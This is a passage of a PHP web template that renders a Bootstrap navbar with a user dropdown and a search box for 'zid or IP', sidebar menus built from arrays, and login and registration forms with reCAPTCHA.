   		<nav class="navbar navbar-inverse navbar-fixed-top">
      		<div class="container-fluid">
        		<div class="navbar-header">
          			<a class="navbar-brand" href="#">$sitename</a>
        		</div>
       			<div id="navbar" class="navbar-collapse collapse">
          			<ul class="nav navbar-nav navbar-right">
html;

	if(user_logged_in()) {
		$username = get_username(get_userid());
		echo '<li class="dropdown">
             	<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">'.$username.'<span class="caret"></span></a>
              	<ul class="dropdown-menu">';
        foreach($loggedinmenu as $limtitle => $limlink) {
			if($limtitle == "divider") {
					echo '<li role="separator" class="divider"></li>';
				} else {
					echo '<li><a href="'.$limlink.'">'.$limtitle.'</a></li>';
				}
			}
		echo <<<html
		        </ul>
            </li>
          </ul>
          <form class="navbar-form navbar-right">
            <input type="text" class="form-control" placeholder="Search via zid or IP...">
          </form>
        </div>
      </div>
    </nav>
html;
		} else {
			echo <<<html
					<li><a onclick="fade_background('#loginposi');">Login</a></li>
					<li><a onclick="fade_background('#registerposi');">Register</a></li>
			   </ul>
            </li>
          </ul>
        </div>
      </div>
    </nav>
html;
		}
	echo <<<html
	    <div class="container-fluid">
      		<div class="row">
        		<div class="col-sm-3 col-md-2 sidebar">
          			<ul class="nav nav-sidebar">
html;
        foreach($nav as $title => $link) {
			if($title == $current) {
				echo '<li class="active"><a href="'.$link.'">'.$title.'</a></li>';
			} else {
				echo '<li><a href="'.$link.'">'.$title.'</a></li>';
			}
		}
		echo '</ul><ul class="nav nav-sidebar">';
		foreach($sidebararray as $title => $onclick) {
			if($title == "divider") {
				echo "<li class='sub-header' style='padding-left: 10px;'>$onclick</li>";
			} else {
				if(is_array($onclick)) {
					echo '<li class="dropdown">
					      	<a href="#" class="dropdown-toggle" data-toggle="dropdown">'.$title.' <span class="caret"></span></a>
                            <ul class="dropdown-menu" role="menu" style="width: 100%;">';
                    foreach($onclick as $dropdowntitle => $dropdownonclick) {
                    	if($dropdowntitle == "dropdown_header") {
                    		echo "<li class='dropdown-header'>$dropdownonclick</li>";
                    	} else {
                    		echo '<li><a href="#" onclick="'.$dropdownonclick.'">'.$dropdowntitle.'</a></li>';
                    	}
                    }
					echo "</ul>
                	</li>";
				} else {
					echo '<li><a href="#" onclick="'.$onclick.'">'.$title.'</a></li>';
				}
			}
		}
echo <<<html
          		</ul>
        	</div>
        </div>
<script src="./styles/jquery/jquery.min.js"></script>
<script src="./styles/bootstrap-3.3.7/js/bootstrap.min.js"></script>
<script type="text/javascript" src="./styles/jquery/jquery-ui.js"></script>
<script type="text/javascript" src="./styles/jquery/jquery.js"></script>
<div id="backdrop"></div>
<div id="loginposi">
	<div id="login">
		<div id="message"></div>
		<div id="loginheader"><center>Login</center></div>
			<br>
			<form onsubmit="return login_ajax();">
				<center>
					<table>
						<tr>
							<td>
								Username<br>
								<input type="text" name="username" id="username" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Password<br>
								<input type="password" name="password" id="password" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Remember Me <input type="checkbox" name="rememberme" id="rememberme">
							</td>
						</tr>
						<tr>
							<td>
								<input type="submit" name="login" value="Login" class="styledButton">
							</td>
						</tr>
					</table>
				</center>
			</form>
	</div>
</div>

<div id="registerposi">
	<div id="login">
		<div id="rmessage"></div>
		<div id="loginheader"><center>Register</center></div>
			<br>
			<form onsubmit="return register_ajax();">
				<center>
					<table>
						<tr>
							<td>
								Username<br>
								<input type="text" name="username" id="rusername" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Password<br>
								<input type="password" name="password" id="rpassword" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Re-Enter Password<br>
								<input type="password" name="password2" id="password2" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Email<br>
								<input type="text" name="email" id="email" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
html;
echo recaptcha_get_html($publickey);
echo '</td>
						</tr>
						<tr>
							<td>
								<input type="submit" name="register" value="Register" class="styledButton">
								<span id="loadimage"></span>
							</td>
						</tr>
					</table>
				</center>
			</form>
	</div>
</div>';
}
?>